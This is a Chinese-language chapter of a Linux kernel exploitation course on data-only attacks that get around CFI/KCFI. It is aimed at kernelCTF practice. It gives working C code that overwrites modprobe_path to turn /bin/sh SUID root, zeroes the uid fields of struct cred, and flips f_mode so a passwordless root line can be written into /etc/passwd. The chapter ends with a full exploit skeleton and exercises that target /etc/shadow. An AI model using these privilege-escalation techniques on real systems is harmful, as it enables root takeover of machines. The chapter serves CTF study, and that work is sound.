# Ch 18 — CFI / KCFI 之後：data-only attack 為什麼成主流

> 目標：CFI 把 indirect call 的目標鎖在同 type 的 function，ROP / JOP 路被封。但 `task->cred` 改成 0、`file->f_op` 換成其他合法 ops 這些純改 data 的路沒被管到。這章整理 data-only 的路徑選擇。

## CFI 擋的是什麼，沒擋的是什麼

CFI（Control Flow Integrity）分兩個方向：

| 方向 | 技術 | 擋什麼 |
|---|---|---|
| 前向邊（forward-edge） | KCFI / CFI type check | 你把 function pointer 換成錯誤 type 的 function |
| 後向邊（backward-edge） | Shadow Call Stack（SCS）/ stack canary | ROP：return address 被覆寫 |

前向邊：每個 indirect call 在 runtime check 目標函式的 type id。你把 `tty_struct->ops->ioctl` 指向 `pivot_gadget`（一個 asm 片段），但那個片段的 type id 不符合 `ioctl` 的 function signature → KCFI 觸發 panic。

後向邊：return address 被覆寫 → shadow stack 與 main stack 不一致 → SCS 觸發 panic。

**CFI 完全沒擋的**：你只改 data，不改 code pointer，也不改 return address。

---

## 有效的 data-only 目標清單

### 1. `current->cred` 的 uid/gid 欄位

```c
/* struct cred 裡 */
kuid_t uid, gid, suid, sgid, euid, egid, fsuid, fsgid;
```

把這些全改成 0 → 你的 process 變 root。不涉及任何 function call。

**取得任意寫原語後的操作**：

```c
/* 假設 write_kernel(addr, val, size) 是你的任意寫 primitive */
uint64_t cred_addr = leak_current_cred();
/* uid/gid 在 cred+4，各 4 bytes */
for (int i = 4; i <= 36; i += 4)
    write_kernel(cred_addr + i, 0, 4);
```

### 2. `modprobe_path`

kernel 全域字串，當 kernel 需要載入 module 時執行它（`/sbin/modprobe`）。

觸發時機：執行一個 kernel 不認識的 ELF magic 的 binary。

```c
/* 寫 modprobe_path */
write_kernel(modprobe_path_addr, "/tmp/x", 7);

/* /tmp/x 是你準備的 shell script */
system("echo '#!/bin/sh\nchmod 4777 /bin/sh' > /tmp/x && chmod +x /tmp/x");

/* 觸發 modprobe：用 unknown file magic */
system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/t && chmod +x /tmp/t && /tmp/t 2>/dev/null");

/* 現在 /bin/sh 是 SUID root */
system("/bin/sh -p");
```

**優點**：不需要 KASLR bypass（用物理掃描找 `modprobe_path` 的物理 page）、不需要 RIP 控制。

**缺點**：需要能執行任意 binary（CTF 沙盒可能不允許），以及 `modprobe_path` 可能被某些 distro hardening 清空。

### 3. `core_pattern`

kernel 全域字串，process crash 時 kernel 呼叫它處理 core dump。格式支援 `|/path/to/prog`（pipe 模式），讓 kernel 把 core dump pipe 給你的程式。

```c
write_kernel(core_pattern_addr, "|/tmp/x %P", 11);
/* 觸發：讓某個 process crash（發 SIGSEGV 給自己） */
kill(getpid(), SIGSEGV);
```

### 4. `poweroff_cmd`

kernel 關機時執行的指令。在 CTF 沙盒環境下不常用，但某些題目允許。

### 5. `file->f_mode` / `file->f_flags` 欄位

更精細的 file-level 權限控制。例如把一個以 `O_RDONLY` 開的 fd 的 `f_mode` 改成 `FMODE_WRITE`，讓這個 fd 可以寫入 read-only 的檔案（例如 `/etc/passwd`）。

```c
/* 開 /etc/passwd（只讀） */
int fd = open("/etc/passwd", O_RDONLY);
uint64_t file_addr = leak_file_struct(fd);

/* f_mode 在 struct file 裡偏移 20 bytes（6.x），把 FMODE_WRITE bit 設上 */
#define FMODE_WRITE 0x2
uint32_t cur_mode;
read_kernel(file_addr + 20, &cur_mode, 4);
write_kernel(file_addr + 20, cur_mode | FMODE_WRITE, 4);

/* 現在可以 write(fd, ...) 寫 /etc/passwd */
write(fd, "root::0:0:root:/root:/bin/sh\n", 28);
```

### 6. `task_struct->mm->mmap_base` 欄位

改 user-space ASLR 的 base，讓你的 exploit 的 user-space buffer 在可預測的地址 — 這是 info leak 的替代路線（反向：不 leak kernel，而是讓 user 地址固定）。

### 7. `nf_hook_ops` / iptables rule data

netfilter 的 hook 和 rule 存的都是純 data（match / target data），改掉後下次封包進來 netfilter 用你的 data 做判斷。可以利用這個讓 kernel 執行自訂邏輯。

---

## 取得任意寫原語的路徑

data-only attack 的前提是**任意寫原語**（Write-What-Where primitive）。幾種取得方式：

| 方式 | 精確度 | 需要 |
|---|---|---|
| Dirty Pagetable（Ch 14）| 任意物理地址 | cross-cache → PTE page |
| USMA（Ch 15） | 任意 kernel VA | Dirty Pagetable + kernel base |
| OOB write（heap） | 相對地址（從 UAF chunk 偏移） | 知道 victim 物件 layout |
| `msg_msg` UAF + spray | 有限控制（覆寫鄰近物件） | spray 精確 |
| pipe_buffer write | page 級別 | pipe_buffer 的 page pointer 可控 |

**最強的任意寫**是 Dirty Pagetable → 任意物理地址，再配合 data-only target。

---

## type-compatible gadget：KCFI 不完全擋

如果你非要走 function pointer，KCFI 的繞法是找 **type-compatible function**：和 `tty_struct->ops->ioctl` 同 function signature 的合法函式，讓 KCFI 的 type check 通過。

同 signature = 相同的 return type + 相同數量和類型的參數。

`tty_ioctl` 的 signature：`int (struct tty_struct *, struct file *, unsigned int, unsigned long)`

你需要找一個符合這個 signature 的 kernel function，它的功能是：當被呼叫時，做一些對你有利的事（或者能 chain 到其他事）。

這叫 **type-compatible gadget hunt**，難度遠高於 ROP gadget，但存在。kernelCTF 的一些 2024 writeup 就用了這個技術。

---

## data-only 的完整 exploit 骨架

```c
#define _GNU_SOURCE
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>

/* 假設已有這兩個原語（由 Ch 14 Dirty Pagetable 提供） */
extern void write_phys(uint64_t phys_addr, const void *buf, size_t len);
extern void read_phys(uint64_t phys_addr, void *buf, size_t len);

/* 已從 /proc/kallsyms 或 info leak 拿到這些物理地址 */
extern uint64_t modprobe_path_phys;
extern uint64_t current_cred_phys;

static void setup_modprobe_path(void) {
    /* /tmp/x 是預先準備好的 SUID-grant script */
    system("echo '#!/bin/sh\nchmod 4777 /bin/sh' > /tmp/x && chmod +x /tmp/x");
    write_phys(modprobe_path_phys, "/tmp/x\0", 7);
}

static void trigger_modprobe(void) {
    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/t && chmod +x /tmp/t");
    system("/tmp/t 2>/dev/null; true");
}

static void overwrite_cred_root(void) {
    /* usage(refcount)=1, uid/gid/suid/sgid/euid/egid/fsuid/fsgid = 0 */
    uint8_t cred_patch[40];
    memset(cred_patch, 0, sizeof(cred_patch));
    *(uint32_t *)cred_patch = 1;  /* usage */
    write_phys(current_cred_phys, cred_patch, sizeof(cred_patch));
}

int main(void) {
    /* 方法 A：改 modprobe_path */
    setup_modprobe_path();
    trigger_modprobe();
    if (access("/bin/sh", X_OK) == 0)
        execl("/bin/sh", "sh", "-p", NULL);

    /* 方法 B：直接改 cred（如果能 leak current->cred phys） */
    overwrite_cred_root();
    printf("uid = %d\n", getuid());
    if (getuid() == 0)
        execl("/bin/sh", "sh", NULL);

    return 0;
}
```

---

## 動手練習

1. **找 modprobe_path 的 symbol 地址**：`cat /proc/kallsyms | grep modprobe_path`，確認地址，算出物理地址（kva - PAGE_OFFSET），用 QEMU monitor 讀物理地址確認字串。
2. **實作 f_mode 修改**：打開 `/etc/shadow`（只讀），用你的任意寫 primitive 把 f_mode 的 FMODE_WRITE bit 設上，確認能用 `write()` 寫入。
3. **找 type-compatible gadget**：用 `pahole -C tty_operations vmlinux` 看 `ioctl` 的 function signature，然後 `grep -r "int.*tty_struct.*file.*unsigned int.*unsigned long" include/linux/` 找其他符合這個 signature 的函式 declaration。
4. **測試 core_pattern**：在開了 `/proc/sys/kernel/core_pattern` 的 QEMU 環境裡，手動 echo 一個 `|/tmp/x %P` 進去（不用 exploit），確認 process crash 時你的 script 被呼叫。
5. **不用 modprobe，只改 cred**：在 Ch 13 的 exploit 骨架上，改成「overwrite uid/gid = 0」的 data-only 路線，移除所有 ROP-related code，確認能取得 root。

## 自我檢核

- [ ] 能列出 5 個 data-only 的 write target（cred uid、modprobe_path、core_pattern、f_mode、poweroff_cmd）
- [ ] 知道 KCFI 擋的是 function pointer 的 type mismatch，data write 不受影響
- [ ] 知道 type-compatible gadget 的概念（同 signature 的合法函式）
- [ ] 能說出 modprobe_path 攻擊的完整步驟（寫字串 → 執行 unknown binary → trigger modprobe）
- [ ] 知道 `f_mode` 的 FMODE_WRITE bit 改掉後的效果
- [ ] 能說出取得任意寫 primitive 的 4 種路徑

→ [Ch 19 — netfilter / nf_tables：kernelCTF 最大礦區](./19-netfilter-nftables.md)
